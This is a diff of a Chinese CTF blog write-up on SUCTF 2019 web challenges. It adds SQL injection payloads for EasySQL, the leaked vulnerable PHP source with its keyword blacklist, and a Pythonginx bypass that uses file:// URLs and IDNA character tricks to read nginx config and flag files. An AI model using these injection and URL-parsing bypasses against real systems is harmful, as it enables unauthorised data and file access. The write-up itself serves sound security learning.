@@ -23,15 +23,15 @@
     var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="[SUCTF 2019]Pythonginx">
+  <meta name="description" content="[SUCTF 2019]EasySQL [SUCTF 2019]CheckIn [SUCTF 2019]Pythonginx">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SUCTF 2019 web 部分wp">
 <meta property="og:url" content="http://yq1ng.github.io/z_post/SUCTF-2019/index.html">
 <meta property="og:site_name" content="会下雪的晴天">
-<meta property="og:description" content="[SUCTF 2019]Pythonginx">
+<meta property="og:description" content="[SUCTF 2019]EasySQL [SUCTF 2019]CheckIn [SUCTF 2019]Pythonginx">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-11-30T14:26:13.000Z">
-<meta property="article:modified_time" content="2020-11-30T14:28:25.882Z">
+<meta property="article:modified_time" content="2020-12-02T15:06:53.143Z">
 <meta property="article:author" content="yq1ng">
 <meta name="twitter:card" content="summary">
 
@@ -205,10 +205,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-11-30 22:26:13 / 修改时间：22:28:25" itemprop="dateCreated datePublished" datetime="2020-11-30T22:26:13+08:00">2020-11-30</time>
+              <time title="创建时间：2020-11-30 22:26:13" itemprop="dateCreated datePublished" datetime="2020-11-30T22:26:13+08:00">2020-11-30</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-12-02 23:06:53" itemprop="dateModified" datetime="2020-12-02T23:06:53+08:00">2020-12-02</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -232,14 +238,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>772</span>
+              <span>4.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>8 分钟</span>
             </span>
 
         </div>
@@ -254,13 +260,46 @@
         <!-- TOC -->
 
 <ul>
+<li><a href="#suctf-2019easysql">[SUCTF 2019]EasySQL</a></li>
+<li><a href="#suctf-2019checkin">[SUCTF 2019]CheckIn</a></li>
 <li><a href="#suctf-2019pythonginx">[SUCTF 2019]Pythonginx</a></li>
 </ul>
 <!-- /TOC -->
 
 <a id="more"></a>
-<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>看名知意，给了部分源码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">        </span><br><span class="line"><span class="meta">    @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>这题我也是懵了，过滤太多，堆叠最多查到表名<code>Flag</code>，看wp才知道怎么回事<br>sql:<code>select $_GET[&#39;query&#39;] || flag from flag</code></p>
+<ul>
+<li><p>预期解<br>payload: <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>，通过设置MySQL中<code>sql_mode</code>的<code>PIPES_AS_CONCAT</code>，将<code>||</code>变为字符串连接符而不是或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
+</li>
+<li><p>非预期<br>payload: <code>*,1</code>，没过滤*导致直接读取全部数据</p>
+</li>
+</ul>
+<p>比赛时源码泄露了，这里贴出来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Mysql Connect Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Choose Database Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;query&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|&quot;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">        //var_dump(preg_match(&quot;</span>/&#123;$BlackList&#125;/is<span class="string">&quot;,<span class="subst">$post</span>[&#x27;query&#x27;]));</span></span><br><span class="line"><span class="string">        if(preg_match(&quot;</span>/&#123;$BlackList&#125;/is<span class="string">&quot;,<span class="subst">$post</span>[&#x27;query&#x27;]))&#123;</span></span><br><span class="line"><span class="string">            //echo <span class="subst">$post</span>[&#x27;query&#x27;];</span></span><br><span class="line"><span class="string">            die(&quot;</span>Nonono.<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if(strlen(<span class="subst">$post</span>[&#x27;query&#x27;])&gt;40)&#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>Too long.<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        <span class="subst">$sql</span> = &quot;</span>select <span class="string">&quot;.<span class="subst">$post</span>[&#x27;query&#x27;].&quot;</span>||flag <span class="keyword">from</span> Flag<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        mysqli_multi_query(<span class="subst">$MysqlLink</span>,<span class="subst">$sql</span>);</span></span><br><span class="line"><span class="string">        do&#123;</span></span><br><span class="line"><span class="string">            if(<span class="subst">$res</span> = mysqli_store_result(<span class="subst">$MysqlLink</span>))&#123;</span></span><br><span class="line"><span class="string">                while(<span class="subst">$row</span> = mysqli_fetch_row(<span class="subst">$res</span>))&#123;</span></span><br><span class="line"><span class="string">                    print_r(<span class="subst">$row</span>);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;while(@mysqli_next_result(<span class="subst">$MysqlLink</span>));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>看名知意，给了部分源码，不过俺不会。。。老规矩，先给参考链接，以下可以不看，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/99741920">参考一</a>，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42812036/article/details/104291695">参考二</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">    @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>源码两条提示</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Do you know the nginx? --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>nginx配置</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class="line">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class="line">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class="line">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class="line">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class="line">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br><span class="line">配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>
+
+<p>解析的URL hostname不能为<code>suctf.cc</code>，再次解析的host不能为<code>suctf.cc</code>，最后又要等于<code>suctf.cc</code>。。。</p>
+<ul>
+<li>解法一<br>贴出来师傅的分析脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit,urlunsplit, unquote</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="comment"># url = &quot;www.baidu.com/index.php?id=1&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http:www.baidu.com/index.php?id=1&quot;</span></span><br><span class="line">url = <span class="string">&quot;file:////suctf.cc/usr/local/nginx/conf/nginx.conf&quot;</span></span><br><span class="line">parts = parse.urlsplit(url)</span><br><span class="line">print(parts)</span><br><span class="line"></span><br><span class="line">url2 = urlunsplit(parts)</span><br><span class="line">parts2 = parse.urlsplit(url2)</span><br><span class="line"></span><br><span class="line">print(parts2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#SplitResult(scheme=&#x27;file&#x27;, netloc=&#x27;&#x27;, path=&#x27;suctf.cc/usr/local/nginx/conf/nginx.conf&#x27;, query=&#x27;&#x27;, fragment=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#SplitResult(scheme=&#x27;file&#x27;, netloc=&#x27;&#x27;, path=&#x27;/suctf.cc/usr/local/nginx/conf/nginx.conf&#x27;, query=&#x27;&#x27;, fragment=&#x27;&#x27;)</span></span><br></pre></td></tr></table></figure>
+用file协议去读，所以构造了<code>file:////suctf.cc/usr/local/nginx/conf/nginx.conf</code>去读配置文件<br>发现配置文件的路由有flag<br><code>server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; # location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</code></li>
+</ul>
+<p>同样方法读flag</p>
+<ul>
+<li>解法二<br>还是师傅脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">    tmp=chr(i)    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        res = tmp.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)        </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>) <span class="keyword">in</span> res:            </span><br><span class="line">            <span class="keyword">continue</span>        </span><br><span class="line">        print(<span class="string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.format(tmp, res, i))    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+找出可用字符，用<code>℆</code>代替c/u，即构造<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code></li>
+</ul>
+<p>真难，确实不是我这种菜鸡能单独做出来的，加油，努力成为大菜鸡</p>
+
     </div>
 
     
@@ -315,7 +354,10 @@
     <a href="/z_post/%E7%A5%A5%E4%BA%91%E6%9D%AF2020%E9%83%A8%E5%88%86wp/" rel="prev" title="祥云杯202部分wp">
       <i class="fa fa-chevron-left"></i> 祥云杯202部分wp
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/z_post/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96wp/" rel="next" title="CTFshow 反序列化wp">
+      CTFshow 反序列化wp <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -374,7 +416,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-2019-Pythonginx"><span class="nav-number">1.</span> <span class="nav-text">[SUCTF 2019]Pythonginx</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">1.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">2.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-2019-Pythonginx"><span class="nav-number">3.</span> <span class="nav-text">[SUCTF 2019]Pythonginx</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -390,7 +432,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">48</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -460,13 +502,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">259k</span>
+    <span title="站点总字数">269k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">7:11</span>
+    <span title="站点阅读时长">7:28</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
